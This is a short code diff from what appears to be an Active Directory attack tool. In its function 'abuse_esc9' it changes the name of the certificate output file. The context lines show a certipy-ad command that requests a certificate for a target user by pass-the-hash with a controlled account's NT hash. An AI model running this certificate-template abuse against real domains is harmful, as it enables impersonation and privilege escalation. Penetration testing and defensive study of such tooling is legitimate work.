@@ -40,7 +40,7 @@ def abuse_esc9(session, template):
 
     # Step 3: Request cert using controlled user with target UPN
     print(blue(f"[*] Step 3: Requesting certificate as {target_user}@{session.domain}"), flush=True)
-    output_file = f"esc9_{target_user}.pfx"
+    output_file = f"{target_user}.pfx"
     request_cmd = (
         f"certipy-ad req -u {controlled_user}@{session.domain} -hashes :{nt_hash} "
         f"-ca {session.adcs_metadata['cas'][0]['name']} -template {template} -out {output_file}"
